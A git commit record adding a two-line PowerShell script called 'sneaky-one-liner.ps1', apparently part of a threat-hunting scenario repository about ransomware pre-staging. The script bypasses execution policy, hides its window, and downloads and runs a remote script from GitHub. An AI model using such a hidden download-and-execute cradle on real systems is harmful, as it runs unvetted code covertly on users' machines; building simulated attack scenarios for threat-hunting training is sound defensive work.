507bbeb35b3d6b804e805b9ee1ed339f604075f8
Kevin Lopez <73505550+kevlo-cyber@users.noreply.github.com>
2025-06-17 13:34:33 -0400

    Create sneaky-one-liner.ps1

---
+++ scripts/sneaky-one-liner.ps1
@@ -0,0 +1,2 @@
+powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden `
+  -Command "iex (iwr -UseBasicParsing 'https://raw.githubusercontent.com/kevlo-cyber/threat-hunting-scenario-ransomware-pre-staging-activity/main/scripts/stig-pre-staging-iocs.ps1')"
